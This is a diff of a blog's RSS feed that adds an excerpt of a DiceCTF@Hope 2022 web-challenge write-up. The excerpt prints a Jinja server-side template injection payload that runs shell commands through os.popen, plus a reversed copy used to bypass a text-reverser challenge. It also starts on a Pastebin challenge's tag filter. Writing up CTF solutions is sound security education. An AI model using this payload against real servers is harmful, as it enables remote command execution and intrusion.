@@ -2,14 +2,11 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>mathjax on j3seer</title>
-    
-    
-    
     <link>https://j3seer.github.io/tags/mathjax/</link>
     <description>Recent content in mathjax on j3seer</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 29 Sep 2022 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 29 Sep 2022 08:59:19 -0400</lastBuildDate>
     
 	<atom:link href="https://j3seer.github.io/tags/mathjax/index.xml" rel="self" type="application/rss+xml" />
     
@@ -17,21 +14,15 @@
     <item>
       <title>DiceCTF@Hope 2022 - Writeup</title>
       <link>https://j3seer.github.io/posts/dicectfhope_writeup/</link>
-      <pubDate>Thu, 29 Sep 2022 00:00:00 +0000</pubDate>
+      <pubDate>Thu, 29 Sep 2022 08:59:19 -0400</pubDate>
       
       <guid>https://j3seer.github.io/posts/dicectfhope_writeup/</guid>
-      <description>
-        
-          
-          
-          
-        
-        
-        
-          Writeup for web challenges from diceCTF @Hope 2022
-          
-        
-        </description>
+      <description>Mostly solved the web challenges with Task_Hashed
+ Reverser the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed
+regular payload:
+{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}} {{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt&#39;).read()}} supplied reversed payload:
+}} )(daer.)&#39;sl&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc {{ }})(daer.)&#39;txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc{{  Pastebin the important part of this challenge is :
+if (paste.search(/&amp;lt;.*&amp;gt;/) !== -1) { return res.redirect(&amp;#39;/flash?message=Illegal characters in paste!</description>
     </item>
     
   </channel>
